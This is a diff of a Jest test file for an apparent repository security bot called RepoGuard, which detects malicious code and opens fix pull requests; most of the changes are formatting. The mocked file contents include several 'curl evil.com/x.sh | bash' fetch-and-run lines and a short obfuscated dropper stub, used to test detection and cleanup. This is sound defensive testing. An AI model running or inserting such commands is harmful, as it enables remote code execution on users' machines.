         "POST /repos/{owner}/{repo}/issues/{issue_number}/labels",
-        expect.objectContaining({ issue_number: 100, labels: ["repoguard", "security", "automated-fix"] })
+        expect.objectContaining({
+          issue_number: 100,
+          labels: ["repoguard", "security", "automated-fix"],
+        }),
       );
     });
 
@@ -1352,7 +1566,9 @@ global.i = "malicious";
           return {
             data: {
               type: "file",
-              content: Buffer.from("const token = process.env.TOKEN;").toString("base64"),
+              content: Buffer.from("const token = process.env.TOKEN;").toString(
+                "base64",
+              ),
               sha: "file-sha-123",
             },
           };
@@ -1378,7 +1594,10 @@ global.i = "malicious";
         findings,
       });
 
-      expect(requestMock).toHaveBeenCalledWith("POST /repos/{owner}/{repo}/issues", expect.any(Object));
+      expect(requestMock).toHaveBeenCalledWith(
+        "POST /repos/{owner}/{repo}/issues",
+        expect.any(Object),
+      );
     });
 
     it("prepends the file header block when there are unpatched findings in the file", async () => {
@@ -1387,7 +1606,9 @@ global.i = "malicious";
           return {
             data: {
               type: "file",
-              content: Buffer.from("curl http://evil.com/x.sh | bash\nconst token = process.env.TOKEN;").toString("base64"),
+              content: Buffer.from(
+                "curl http://evil.com/x.sh | bash\nconst token = process.env.TOKEN;",
+              ).toString("base64"),
               sha: "file-sha-123",
             },
           };
@@ -1403,8 +1624,13 @@ global.i = "malicious";
         }
         if (route === "PUT /repos/{owner}/{repo}/contents/{path}") {
           const putParams = params as { content: string };
-          const savedContent = Buffer.from(putParams.content, "base64").toString("utf8");
-          expect(savedContent).toContain("REPOGUARD — MANUAL REVIEW REQUIRED: test.sh");
+          const savedContent = Buffer.from(
+            putParams.content,
+            "base64",
+          ).toString("utf8");
+          expect(savedContent).toContain(
+            "REPOGUARD — MANUAL REVIEW REQUIRED: test.sh",
+          );
           return { data: {} };
         }
         if (route === "POST /repos/{owner}/{repo}/pulls") {
@@ -1440,7 +1666,10 @@ global.i = "malicious";
         findings,
       });
 
-      expect(requestMock).toHaveBeenCalledWith("POST /repos/{owner}/{repo}/pulls", expect.any(Object));
+      expect(requestMock).toHaveBeenCalledWith(
+        "POST /repos/{owner}/{repo}/pulls",
+        expect.any(Object),
+      );
     });
 
     it("handles collaborators fetching error in getAdminLogins gracefully", async () => {
@@ -1449,7 +1678,9 @@ global.i = "malicious";
           return {
             data: {
               type: "file",
-              content: Buffer.from("const someCode = 1;\ncurl http://evil.com/x.sh | bash").toString("base64"),
+              content: Buffer.from(
+                "const someCode = 1;\ncurl http://evil.com/x.sh | bash",
+              ).toString("base64"),
               sha: "file-sha-123",
             },
           };
@@ -1495,7 +1726,7 @@ global.i = "malicious";
 
       expect(requestMock).not.toHaveBeenCalledWith(
         "POST /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers",
-        expect.any(Object)
+        expect.any(Object),
       );
     });
 
@@ -1505,7 +1736,9 @@ global.i = "malicious";
           return {
             data: {
               type: "file",
-              content: Buffer.from("curl evil.com/x.sh | bash").toString("base64"),
+              content: Buffer.from("curl evil.com/x.sh | bash").toString(
+                "base64",
+              ),
               sha: "file-sha-1",
             },
           };
@@ -1523,7 +1756,12 @@ global.i = "malicious";
           return { data: {} };
         }
         if (route === "POST /repos/{owner}/{repo}/pulls") {
-          return { data: { number: 101, html_url: "https://github.com/test-owner/test-repo/pull/101" } };
+          return {
+            data: {
+              number: 101,
+              html_url: "https://github.com/test-owner/test-repo/pull/101",
+            },
+          };
         }
         if (route === "GET /repos/{owner}/{repo}/labels") {
           return { data: [] };
@@ -1555,9 +1793,122 @@ global.i = "malicious";
         params: c[1],
       }));
       const packageJsonPuts = routesCalled.filter(
-        (c) => c.route === "PUT /repos/{owner}/{repo}/contents/{path}" && c.params?.path === "package.json"
+        (c) =>
+          c.route === "PUT /repos/{owner}/{repo}/contents/{path}" &&
+          c.params?.path === "package.json",
       );
       expect(packageJsonPuts).toHaveLength(0);
+    });
+
+    it("cleans up package.json when a dropper file without .js extension (e.g. template/base/js/init) is deleted", async () => {
+      const pkgContent = JSON.stringify(
+        {
+          name: "test-app",
+          scripts: {
+            init: "node template/base/js/init",
+            build: "node template/base/js/init && next build",
+            test: "jest",
+          },
+        },
+        null,
+        2,
+      );
+
+      // Raw dropper content: standalone malware dropper flagged for deletion
+      const dropperContent = [
+        'import {createRequire} from "module";const require=createRequire(import.meta.url);function y7(R,c){for(var n=[],o=0;o<R.length;)n[o]=R.charAt(o),o++;return n.join("");}',
+        'global["!"]="w0038";',
+        'var p8=y7("malware",6182039);',
+      ].join("\n");
+
+      requestMock.mockImplementation((route: string, params: any) => {
+        if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
+          if (params?.path === "template/base/js/init") {
+            return {
+              data: {
+                type: "file",
+                content: Buffer.from(dropperContent).toString("base64"),
+                sha: "dropper-sha-123",
+              },
+            };
+          }
+          if (params?.path === "package.json") {
+            return {
+              data: {
+                type: "file",
+                content: Buffer.from(pkgContent).toString("base64"),
+                sha: "pkg-sha-456",
+              },
+            };
+          }
+        }
+        if (route === "GET /repos/{owner}/{repo}") {
+          return { data: { default_branch: "main" } };
+        }
+        if (route === "GET /repos/{owner}/{repo}/git/ref/{ref}") {
+          return { data: { object: { sha: "base-sha-123" } } };
+        }
+        if (route === "POST /repos/{owner}/{repo}/git/refs") {
+          return { data: {} };
+        }
+        if (route === "DELETE /repos/{owner}/{repo}/contents/{path}") {
+          return { data: {} };
+        }
+        if (route === "PUT /repos/{owner}/{repo}/contents/{path}") {
+          return { data: {} };
+        }
+        if (route === "POST /repos/{owner}/{repo}/pulls") {
+          return {
+            data: {
+              number: 105,
+              html_url: "https://github.com/test-owner/test-repo/pull/105",
+            },
+          };
+        }
+        if (route === "GET /repos/{owner}/{repo}/labels") {
+          return { data: [] };
+        }
+        if (route === "GET /repos/{owner}/{repo}/collaborators") {
+          return { data: [] };
+        }
+        return { data: {} };
+      });
+
+      const findings: Finding[] = [
+        {
+          rule: "obfuscated-malware-pattern",
+          severity: "critical",
+          message: "createRequire import and obfuscated dropper",
+          file: "template/base/js/init",
+        },
+      ];
+
+      await openFixPR(mockOctokit, {
+        owner: "test-owner",
+        repo: "test-repo",
+        findings,
+      });
+
+      // 1. Verify dropper file was deleted
+      expect(requestMock).toHaveBeenCalledWith(
+        "DELETE /repos/{owner}/{repo}/contents/{path}",
+        expect.objectContaining({ path: "template/base/js/init" }),
+      );
+
+      // 2. Verify package.json was updated to remove dropper execution
+      const putCalls = requestMock.mock.calls.filter(
+        (c) =>
+          c[0] === "PUT /repos/{owner}/{repo}/contents/{path}" &&
+          c[1]?.path === "package.json",
+      );
+      expect(putCalls).toHaveLength(1);
+
+      const updatedPkg = JSON.parse(
+        Buffer.from(putCalls[0][1].content, "base64").toString("utf8"),
+      );
+      expect(updatedPkg.scripts.build).toBe("next build");
+      expect(updatedPkg.scripts.init).toBeUndefined();
+      expect(updatedPkg.scripts.test).toBe("jest");
     });
   });
 
@@ -1594,7 +1945,8 @@ global.i = "malicious";
             data: [
               {
                 number: 201,
-                title: "⚠️ RepoGuard: Security findings requiring manual review",
+                title:
+                  "⚠️ RepoGuard: Security findings requiring manual review",
                 labels: [{ name: "repoguard" }],
               },
               {
@@ -1731,7 +2083,9 @@ global.i = "malicious";
           line: 12,
         },
       ];
-      const patchedContent = new Map([["src/api.ts", "const token = 'ghp_xxx';"]]);
+      const patchedContent = new Map([
+        ["src/api.ts", "const token = 'ghp_xxx';"],
+      ]);
 
       await postReviewComments(
         mockOctokit,
@@ -1761,11 +2115,14 @@ global.i = "malicious";
       );
 
       const reviewCall = requestMock.mock.calls.find(
-        (c) => c[0] === "POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews",
+        (c) =>
+          c[0] === "POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews",
       );
       const commentBody = reviewCall[1].comments[0].body;
       expect(commentBody).toContain("```suggestion");
-      expect(commentBody).toContain("// TODO: Replace hardcoded credential with process.env variable");
+      expect(commentBody).toContain(
+        "// TODO: Replace hardcoded credential with process.env variable",
+      );
       expect(commentBody).toContain("Rotate this secret immediately");
     });
 
@@ -1779,7 +2136,9 @@ global.i = "malicious";
           line: 5,
         },
       ];
-      const patchedContent = new Map([[".github/workflows/ci.yml", "on: push"]]);
+      const patchedContent = new Map([
+        [".github/workflows/ci.yml", "on: push"],
+      ]);
 
       await postReviewComments(
         mockOctokit,
@@ -1793,10 +2152,13 @@ global.i = "malicious";
       );
 
       const reviewCall = requestMock.mock.calls.find(
-        (c) => c[0] === "POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews",
+        (c) =>
+          c[0] === "POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews",
       );
       const commentBody = reviewCall[1].comments[0].body;
-      expect(commentBody).toContain("**RepoGuard** detected `workflow-suspicious-trigger`");
+      expect(commentBody).toContain(
+        "**RepoGuard** detected `workflow-suspicious-trigger`",
+      );
       expect(commentBody).toContain("Manual review required");
       expect(commentBody).not.toContain("Rotate this secret immediately");
     });
@@ -1811,9 +2173,14 @@ global.i = "malicious";
           line: 12,
         },
       ];
-      const patchedContent = new Map([["src/api.ts", "const token = 'ghp_xxx';"]]);
+      const patchedContent = new Map([
+        ["src/api.ts", "const token = 'ghp_xxx';"],
+      ]);
       const fileSuggestions = new Map([
-        ["src/api.ts", new Map([[12, "const token = process.env.GITHUB_TOKEN || '';"]])],
+        [
+          "src/api.ts",
+          new Map([[12, "const token = process.env.GITHUB_TOKEN || '';"]]),
+        ],
       ]);
 
       await postReviewComments(
@@ -1829,10 +2196,13 @@ global.i = "malicious";
       );
 
       const reviewCall = requestMock.mock.calls.find(
-        (c) => c[0] === "POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews",
+        (c) =>
+          c[0] === "POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews",
       );
       const commentBody = reviewCall[1].comments[0].body;
-      expect(commentBody).toContain("```suggestion\nconst token = process.env.GITHUB_TOKEN || '';\n```");
+      expect(commentBody).toContain(
+        "```suggestion\nconst token = process.env.GITHUB_TOKEN || '';\n```",
+      );
       expect(commentBody).toContain("Rotate this secret immediately");
     });
   });
@@ -1864,7 +2234,9 @@ global.i = "malicious";
           return {
             data: {
               type: "file",
-              content: Buffer.from("curl evil.com/x.sh | bash\nconst fine = 1;").toString("base64"),
+              content: Buffer.from(
+                "curl evil.com/x.sh | bash\nconst fine = 1;",
+              ).toString("base64"),
               sha: "sha-new-finding",
             },
           };
@@ -1872,10 +2244,14 @@ global.i = "malicious";
         if (route === "PUT /repos/{owner}/{repo}/contents/{path}") {
           return { data: {} };
         }
-        if (route === "POST /repos/{owner}/{repo}/issues/{issue_number}/comments") {
+        if (
+          route === "POST /repos/{owner}/{repo}/issues/{issue_number}/comments"
+        ) {
           return { data: {} };
         }
-        if (route === "POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews") {
+        if (
+          route === "POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews"
+        ) {
           return { data: {} };
         }
         throw new Error(`Unexpected route: ${route}`);
@@ -1941,12 +2317,16 @@ global.i = "malicious";
           return {
             data: {
               type: "file",
-              content: Buffer.from("# REMOVED BY REPOGUARD: curl|bash remote execution\nconst fine = 1;").toString("base64"),
+              content: Buffer.from(
+                "# REMOVED BY REPOGUARD: curl|bash remote execution\nconst fine = 1;",
+              ).toString("base64"),
               sha: "sha-already-patched",
             },
           };
         }
-        if (route === "POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews") {
+        if (
+          route === "POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews"
+        ) {
           return { data: {} };
         }
         throw new Error(`Unexpected route: ${route}`);
@@ -1971,7 +2351,9 @@ global.i = "malicious";
 
       // Verify NO commit was pushed and NO PR was created
       const routesCalled = requestMock.mock.calls.map((c) => c[0]);
-      expect(routesCalled).not.toContain("PUT /repos/{owner}/{repo}/contents/{path}");
+      expect(routesCalled).not.toContain(
+        "PUT /repos/{owner}/{repo}/contents/{path}",
+      );
       expect(routesCalled).not.toContain("POST /repos/{owner}/{repo}/pulls");
     });
   });
